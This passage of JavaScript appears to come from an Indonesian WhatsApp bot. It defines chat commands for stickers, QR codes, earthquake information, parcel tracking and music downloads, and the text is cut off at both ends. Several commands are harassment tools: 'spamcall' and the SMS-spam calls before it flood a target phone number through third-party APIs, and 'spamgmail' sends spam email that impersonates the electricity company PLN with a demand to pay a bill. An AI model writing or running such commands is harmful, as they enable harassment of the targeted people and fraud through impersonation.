		await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=${LolApi}&nomor=${nomor}`)
		await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=${LolApi}&nomor=${nomor}`)
		await fetchJson(`http://api.lolhuman.xyz/api/sms/spam7?apikey=${LolApi}&nomor=${nomor}`)
		await fetchJson(`http://api.lolhuman.xyz/api/sms/spam8?apikey=${LolApi}&nomor=${nomor}`)
		reply("Success")
		break
case 'spamcall':
	if (!isRegistered) return reply(mess.only.userB)
	if (isBanned) return reply(mess.only.benned)
	if (isLimit(sender)) return reply(mess.limituser)
if (!isPremium) return reply(mess.only.premium)
call = `${body.slice(11)}`
anu = await fetchJson(`https://h4ck3rs404-api.herokuapp.com/api/spamcall?number=${call}&apikey=404Api`)
//anu = await fetchJson(`https://alfians-api.herokuapp.com/api/spamcall?no=${call}`)
client.sendMessage(from, `${anu.status}`, text, {quoted: mek})
//client.sendMessage(from, `${anu.logs}`, text, {quoted: mek})
await limitAdd(sender) 
break  
case 'spamgmail':
	if (!isRegistered) return reply(mess.only.userB)
	if (isBanned) return reply(mess.only.benned)
	if (isLimit(sender)) return reply(mess.limituser)
	reply(mess.wait)
spam = `${body.slice(10)}`
anu = await fetchJson(`https://videfikri.com/api/spamemail/?email=${spam}&subjek=PT.PLN&pesan=Silahkan%20bayar%20tagihan%20listrik%20Anda`, {method: 'get'})
client.sendMessage(from, `${anu.result.log_lengkap}`, text, {quoted: mek})
await limitAdd(sender) 
break  
	case 'qrcode':
		if (!isRegistered) return reply(mess.only.userB)
	    if (isBanned) return reply(mess.only.benned)
	    if (isLimit(sender)) return reply(mess.limituser)
		reply(mess.wait)
		ajgn = body.slice(8)
		hasil = await getBuffer(`http://api.lolhuman.xyz/api/qrcode?apikey=${LolApi}&text=${ajgn}`, {method: 'get'})
		client.sendMessage(from, hasil, image, {quoted: mek})
		break
	case 'qrreader':
		if (!isRegistered) return reply(mess.only.userB)
	    if (isBanned) return reply(mess.only.benned)
	    if (isLimit(sender)) return reply(mess.limituser)
		reply(mess.wait)
		if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
			const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			const filePath = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
			const form = new FormData();
			const stats = fs.statSync(filePath);
			const fileSizeInBytes = stats.size;
			const fileStream = fs.createReadStream(filePath);
			form.append('img', fileStream, { knownLength: fileSizeInBytes });
			const options = {
				method: 'POST',
				credentials: 'include',
				body: form
			}
			get_result = await fetchJson(`http://api.lolhuman.xyz/api/read-qr?apikey=${LolApi}`, {...options })
			fs.unlinkSync(filePath)
			reply("Result: " + get_result.result)
		} else {
			reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
		}
		break
case 'stickerwa':
case 'stikerwa':
	    if (!isRegistered) return reply(mess.only.userB)
	    if (isBanned) return reply(mess.only.benned)
	    if (isLimit(sender)) return reply(mess.limituser)
        if (!isPremium) return reply(mess.only.premium)
		if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
		reply(mess.wait)
		query = args.join(" ")
		get_result = await fetchJson(`http://api.lolhuman.xyz/api/stickerwa?apikey=${LolApi}&query=${query}`)
		get_result = get_result.result[0].stickers
		for (var x of get_result) {
		ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/convert/towebp?apikey=${LolApi}&img=${x}`)
		client.sendMessage(from, ini_buffer, sticker)
		}
		await limitAdd(sender) 
		break
	case 'smoji':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
		reply(mess.wait)
		emojii = args[0]
		try {
		emojii = encodeURI(emojii[0])
		} catch {
		emojii = encodeURI(emojii)
		}
		ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emojii}?apikey=${LolApi}`)
		client.sendMessage(from, ini_buffer, sticker, { quoted: mek })
		await limitAdd(sender) 
		break
	case 'estiker':
	case 'esticker':
	case 'emojistiker':
	case 'emojisticker':
		if (!isPremium) return reply(mess.only.premium)
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
		reply(mess.wait)
		qes = args.join(" ")
		emoji.get(`${qes}`).then(emoji => {
		teks = `${emoji.images[4].url}`
		sendStickerFromUrl(from,`${teks}`)	
		console.log(teks)
		})
		break
	case 'telesticker':
		if (!isPremium) return reply(mess.only.premium)
		if (!isRegistered) return reply(mess.only.userB)
    	if (isBanned) return reply(mess.only.benned)
	    if (isLimit(sender)) return reply(mess.limituser)
		if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
		reply(mess.wait)
		ini_url = args[0]
		ini_url = await fetchJson(`http://api.lolhuman.xyz/api/telestick?apikey=${LolApi}&url=${ini_url}`)
		ini_sticker = ini_url.result.sticker
		for (sticker_ in ini_sticker) {
		ini_buffer = await getBuffer(ini_sticker[sticker_])
		client.sendMessage(from, ini_buffer, sticker)
		}
		await limitAdd(sender) 
		break
	case 'infonomor':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
     	reply(mess.wait)
		anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${body.slice(10)}`)
		infonomor = `*nomor* \n${anu.nomor} *international* \n${anu.international}`
		reply(infonomor)
		await limitAdd(sender) 
		break 
	case 'infogempa':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
	    get_result = await fetchJson(`http://api.lolhuman.xyz/api/infogempa?apikey=${LolApi}`)
	 	get_result = get_result.result
		ini_txt = `Lokasi : ${get_result.lokasi}\n`
		ini_txt += `Waktu : ${get_result.waktu}\n`
		ini_txt += `Potensi : ${get_result.potensi}\n`
		ini_txt += `Magnitude : ${get_result.magnitude}\n`
		ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
		ini_txt += `Koordinat : ${get_result.koordinat}`
		get_buffer = await getBuffer(get_result.map)
		client.sendMessage(from, get_buffer, image, { quoted: mek, caption: ini_txt })
	    await limitAdd(sender) 
	    break 
	case 'cekresi':
	    	if (!isRegistered) return reply(mess.only.userB)
	    	if (isBanned) return reply(mess.only.benned)
	    	if (isLimit(sender)) return reply(mess.limituser)
	    	if (args.length == 0) return reply(`Example: ${prefix + command} jnt|JP8234909181`)
			const cekresikota =  args.join("").split("|")
            const cekresi22 =  args.join("").split("|")
            try {
                dataplai = await fetchJson(`https://api.vhtear.com/cekresi?resi=${cekresi22}&kurir=${cekresikota}&apikey=${VthearApi}`)//simple[]
                const dataplay = dataplai.data.result
                 let cekresi1 = `*Hasil Pencarian NO RESI : ${cekresi22}*\n`
                for (let i = 0; i < dataplay.result.manifest.length; i++) {
                    cekresi1 += `\n═════════KETERANGAN════════\n\n*noresi* : ${dataplay.query.waybill}\n*Kurir* : ${dataplay.query.courier}\n---==-summary=-==-\n*delivered?* : ${dataplay.result.delivered}\n*courier_code* : ${dataplay.result.summary.courier_code}\n*courier_name* : ${dataplay.result.summary.courier_name}\n*waybill_number* : ${dataplay.result.summary.waybill_number}\n*service_code* : ${dataplay.result.summary.service_code}\n*waybill_date* : ${dataplay.result.summary.waybill_date}\n*shipper_name* : ${dataplay.result.summary.shipper_name}\n*receiver_name* : ${dataplay.result.summary.receiver_name}\n*origin* : ${dataplay.result.summary.origin}\n*destination* : ${dataplay.result.summary.destination}\n*status* : ${dataplay.result.summary.status}\n=-=-=-=DETAILS=-=-\n*waybill_number* : ${dataplay.result.details.waybill_number}\n*waybill_date* : ${dataplay.result.details.waybill_date}\n*waybill_time* : ${dataplay.result.details.waybill_time}\n*weight* : ${dataplay.result.details.weight}\n*origin* : ${dataplay.result.details.origin}\n*destination* : ${dataplay.result.details.destination}\n*shippper_name* : ${dataplay.result.details.shippper_name}\n*shipper_address1* : ${dataplay.result.details.shipper_address1}\n*shipper_address2* : ${dataplay.result.details.shipper_address2}\n*shipper_address3* : ${dataplay.result.details.shipper_address3}\n*shipper_city* : ${dataplay.result.details.shipper_city}\n*receiver_name* : ${dataplay.result.details.receiver_name}\n*receiver_address1* : ${dataplay.result.details.receiver_address1}\n*receiver_address2* : ${dataplay.result.details.receiver_address2}\n*receiver_address3* : ${dataplay.result.details.receiver_address3}\n*receiver_city* : ${dataplay.result.details.receiver_city}\n=======DELIVERY STATUS====\n*status* : ${dataplay.result.delivery_status.status}\n*pod_receiver* : ${dataplay.result.delivery_status.pod_receiver}\n*pod_date* : ${dataplay.result.delivery_status.pod_date}\n*pod_time* : ${dataplay.result.delivery_status.pod_time}\n\n=======MANIFEST====\n\n*title* : ${dataplay.result.manifest[i].manifest_code}\n*manifest_description* : ${dataplay.result.manifest[i].manifest_description}\n*manifest_date* : ${dataplay.result.manifest[i].manifest_date}\n*manifest_time* : ${dataplay.result.manifest[i].manifest_time}\n*city_name* : ${dataplay.result.manifest[i].city_name}\n`
                }
                await reply(cekresi1)
            }   catch (err){
                console.log(err)
            }
			await limitAdd(sender) 
			break 
	case 'readmore':
		if (!isRegistered) return reply(mess.only.userB)
	if (isBanned) return reply(mess.only.benned)
	if (isLimit(sender)) return reply(mess.limituser)
		if (args.length < 1) return reply('teks nya mana om?')
		var kls = body.slice(9)
		var has = kls.split("/")[0];
		var kas = kls.split("/")[1];
		if (args.length < 1) return reply(mess.blank)
	client.sendMessage(from, `${has}‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎${kas}` , text, { quoted: mek })
		break
//DOWNLOAD & SEARCH MENU
case 'play':
	if (!isRegistered) return reply(mess.only.userB)
	if (isBanned) return reply(mess.only.benned)
	if (!isPremium) return reply(mess.only.premium)
	if (isLimit(sender)) return reply(mess.limituser)
	if (args.length < 1) return reply(`Kirim perintah ${prefix}play judul lagu`)
	reply(mess.wait)
	const play = await ytsr(q);
	if (play.length === 0)
		 return reply(`${q} tidak dapat ditemukan!`);
	var mulaikah = play[0].url;
	yta(mulaikah)
		 .then((resyt3) => {
			  const {
				   dl_link,
				   thumb,
				   title,
				   filesize
			  } = resyt3;
			  const {
				   author,
				   ago,
				   views,
				   desc,
				   timestamp
			  } = play[0];
			  Axios.get(thumb, {
				   responseType: "arraybuffer",
			  }).then(({
				   data
			  }) => {
				   remote(dl_link, async (e, o) => {
						const buffer_thumbyt3 = Buffer.from(data, "base64");
						const capt_yt3 = `*Data berhasil di dapatkan!*

*Title :* ${title}
*Duration :* ${timestamp}
*Ext :* MP3
*Size :* ${sizer(o)}
*Author :* ${author}
*Published :* ${ago}
*Views :* ${views}
*Description :* ${desc ? desc : "-"}

_Silahkan tunggu file audio sedang dikirim mungkin butuh beberapa menit_`;
						const filtermp3 = await Axios.get(
							 `https://tinyurl.com/api-create.php?url=${dl_link}`
						);
						const capt_yt3limited = `*Data berhasil di dapatkan!*

*Title :* ${title}
*Duration :* ${timestamp}
*Ext :* MP3
*Size :* ${sizer(o)}
*Author :* ${author}
*Published :* ${ago}
*Views :* ${views}
*Description :* ${desc ? desc : "-"}
*Link :* ${filtermp3.data}

_Media tersebut telah lewat batas limit, maka disajikan dalam bentuk link_`;
						if (Number(filesize) >= 100000)
							 return sendFromUrl(from, thumb, MessageType.image, capt_yt3limited);
						client.sendMessage(from, buffer_thumbyt3, MessageType.image, {
							 mimetype: Mimetype.jpeg,
							 caption: capt_yt3,
							 quoted: mek,
						});
						//Send MP3
						Axios.get(dl_link, {
							 responseType: "arraybuffer",
						})
							 .then((response) => {
								  const buffer_yt3 = Buffer.from(response.data, "base64");
								  client.sendMessage(from, buffer_yt3, MessageType.audio, {
									   mimetype: Mimetype.mp4Audio, quoted: mek,
								  });
							 })
							 .catch((ex) => {
								  reply(mess.error.bug);
								  ERRLOG(ex);
							 });
				   });
			  });
		 })
		 .catch((e) => {
			  reply(mess.error.bug);
			  ERRLOG(e);
		 }) 
	           break 
    case 'playmp42':
	            if (!isRegistered) return reply(mess.only.userB)
	            if (isBanned) return reply(mess.only.benned)
	            if (!isPremium) return reply(mess.only.premium)
	            if (isLimit(sender)) return reply(mess.limituser)
			    if (args.length == 0) return reply(`Contoh: ${prefix + command} Damara de medhot janji`)
			    reply(mess.wait)
			    try{
			    query = args.join(" ")
			    get_result = await fetchJson(`https://api.zeks.me/api/ytplaymp4/2?apikey=${ZeksApi}&q=${query}`)
			    get_info = get_result.result
			    ini_txt = `*Title :* ${get_info.title}\n`
			    ini_txt += `*Size :* ${get_info.size}\n`
			    ini_txt += `*Quality :* ${get_info.quality}\n`
			    ini_txt += `*Ext :* ${get_info.ext}\n`
			    ini_txt += `*Duration :* ${get_info.duration}\n`
			    ini_txt += `*Source :* ${get_info.source}\n`
			    ini_buffer = await getBuffer(get_info.thumb)
			    client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
			    get_video = await getBuffer(get_info.link)
			    client.sendMessage(from, get_video, video,{ quoted: mek }) 
			    await limitAdd(sender) 
			    } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error.bug)
			    }
			    break
	case 'playmp4':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (!isPremium) return reply(mess.only.premium)
				if (isLimit(sender)) return reply(mess.limituser)
				if (args.length === 0) return reply(`Kirim perintah ${prefix}video _Judul video yang akan dicari_`)
				reply(mess.wait)
				var srch = args.join(" ")
				aramas = await yts(srch);
				aramat = aramas.all 
				var mulaikah = aramat[0].url                            
					  try {
						ytv(mulaikah)
						.then((res) => {
